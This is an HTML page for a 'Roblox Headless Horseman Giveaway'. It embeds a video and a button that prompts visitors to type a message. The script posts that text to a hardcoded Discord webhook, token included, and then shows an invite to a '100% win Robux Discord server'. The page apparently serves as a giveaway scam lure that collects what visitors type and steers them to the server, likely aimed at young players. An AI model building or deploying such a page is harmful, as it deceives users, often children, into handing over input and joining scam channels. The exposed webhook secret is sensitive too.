<!DOCTYPE html>
<html>
<head>
    <title>Roblox Headless Horseman Giveaway</title>
    <style>
        body {
            background-color: #4a4a4a;
            color: #ffffff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        
        .dialog-button {
            background-color: #0084ff;
            color: #ffffff;
            border: none;
            padding: 10px 20px;
            font-size: 18px;
            cursor: pointer;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        
        .dialog-button:hover {
            background-color: #0066cc;
        }
        
        .video-container {
            position: relative;
            padding-bottom: 56.25%;
            padding-top: 30px;
            height: 0;
            overflow: hidden;
        }
        
        .video-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>
    <h1>Roblox Giveaways</h1>
    <div class="video-container">
        <iframe width="560" height="315" src="https://www.youtube.com/embed/SEG4sEGuuho" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    </div>
    <button class="dialog-button" onclick="showPrompt()">Click here to enter your prompt</button>
    <div id="message"></div>

    <script>
        function showPrompt() {
            var promptText = prompt("Enter your message or prompt:");

            if (promptText) {
                // Send the prompt to the webhook
                fetch('https://discord.com/api/webhooks/1423303894116601936/zAXtYRF6YUDJJgwWAxnam-0j9g-cJBPSg7eNvh18edkXhT1tGGB1Z3I2JaTjc2VojbTM', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({content: promptText})
                }).then(response => {
                    if (response.ok) {
                        // Show the invite message after successful send
                        document.getElementById('message').innerHTML = `
                            <p>Join the 100% win Robux Discord server!</p>
                            <a href="https://discord.gg/X9t9MSjN" target="_blank" style="color:#00ffff;">https://discord.gg/X9t9MSjN</a>
                        `;
                    } else {
                        alert('Failed to send your message. Please try again.');
                    }
                }).catch(error => {
                    alert('Error sending message: ' + error);
                });
            } else {
                alert("No prompt entered.");
            }
        }
    </script>
</body>
</html>
